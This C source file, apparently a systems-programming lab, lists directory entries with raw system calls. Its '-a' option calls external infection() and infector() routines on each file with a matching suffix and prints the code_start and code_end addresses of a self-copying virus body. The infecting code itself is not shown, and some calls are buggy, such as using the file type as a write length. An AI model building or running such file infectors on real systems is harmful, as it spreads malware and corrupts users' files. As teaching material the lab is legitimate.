#include "util.h"

extern  code_end();
extern  code_start();

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_getdents 141
#define SYS_OPEN 5
#define BUF_SIZE 8192
#define STDERR 2

struct linux_dirent {
    long           d_ino;
    int            d_off;
    unsigned short d_reclen;
    char           d_name[];
};
  
int main(int argc, char *argv[])
{
 	int fd, nread;
    char buf[BUF_SIZE];
    struct linux_dirent *d;
    int bpos;
    char d_type;
    char space[1]="\n";
    int k, suffixLocation= -1;
    int p,count,nameLength;
    char* starter ;
    char* ender;
    char *num;
    char enter[1]="\n";
    char name_length;
    int is_s=0;
    int is_a=0;
    int is_d=0;

    fd = system_call(SYS_OPEN,".",0,0);
    for (k=0 ; k<argc; k++){
        if ((strcmp(argv[k],"-d")==0))
            is_d=1;
        if ((strcmp(argv[k],"-s")==0)){
            k+=1;
            suffixLocation=k;
            is_s=1;
        }
        else if ((strcmp(argv[k],"-a")==0)){
            k+=1;
            suffixLocation=k;
            is_a=1;
            infection();
        }
     
    }

    if(is_d==1){
        system_call(SYS_WRITE,STDERR,"Id:5",4);
        system_call(SYS_WRITE,STDERR,enter,1);
        num=itoa(fd);
        system_call(SYS_WRITE,STDERR,num,1);
        system_call(SYS_WRITE,STDERR,enter,1);  
           } 

    for(;;){
        nread = system_call(SYS_getdents, fd, buf, BUF_SIZE);
        if(nread== -1)
            return(1);
		if(nread==0)
            break;
        for (bpos = 0; bpos < nread;) {
            d = (struct linux_dirent *) (buf + bpos);
            d_type = *(buf + bpos + d->d_reclen - 1);

            count=0; 
            for (p=0; d->d_name[p]!=0; p++)
                count+=1;
            nameLength=count;

            if (is_s==1){
                if (d->d_name[nameLength-1]==*argv[suffixLocation]){
                    if(d_type!=4){
                    name_length=system_call(SYS_WRITE,STDOUT,d->d_name,d_type);
                    system_call(SYS_WRITE,STDOUT,space,1);
                     }
                    if(is_d==1&&d_type!=4){
                        system_call(SYS_WRITE,STDERR,"length: ",8);
                        num=itoa(strlen(d->d_name));
                        system_call(SYS_WRITE,STDERR,num,1);
                        system_call(SYS_WRITE,STDERR,enter,1);  
                    }
                }
            }
            else if(is_a==1){
                if (d->d_name[nameLength-1]==*argv[suffixLocation]){
                    name_length=system_call(SYS_WRITE,STDOUT,d->d_name,d_type);
                    system_call(SYS_WRITE,STDOUT,space,1);
                    infector(d->d_name);

                    if(is_d==1){
                        system_call(SYS_WRITE,STDERR,"length: ",8);
                        num=itoa(strlen(d->d_name));
                        system_call(SYS_WRITE,STDERR,num,1);
                        system_call(SYS_WRITE,STDERR,enter,1);  
                    }
                } 
            }
            else {
                if(d_type!=4){
                system_call(SYS_WRITE,STDOUT,d->d_name,d_type);
                system_call(SYS_WRITE,STDOUT,space,1);

                if(is_d==1){
                        system_call(SYS_WRITE,STDERR,"length: ",8);
                        num=itoa(strlen(d->d_name));
                        system_call(SYS_WRITE,STDERR,num,1);
                        system_call(SYS_WRITE,STDERR,enter,1);  
                }
                }
            }
            bpos += d->d_reclen;
        }
    }

    starter = itoa ((int)code_start);
    system_call(SYS_WRITE,STDOUT,"the address of code_start:\n",27);
    system_call(SYS_WRITE,STDOUT,starter,12);
    system_call(SYS_WRITE,STDOUT,space,1);
          
    ender = itoa ((int)code_end);
    system_call(SYS_WRITE,STDOUT,"the address of code_end:\n",25);
    system_call(SYS_WRITE,STDOUT,ender,12);
    system_call(SYS_WRITE,STDOUT,space,1);

return 0;
}
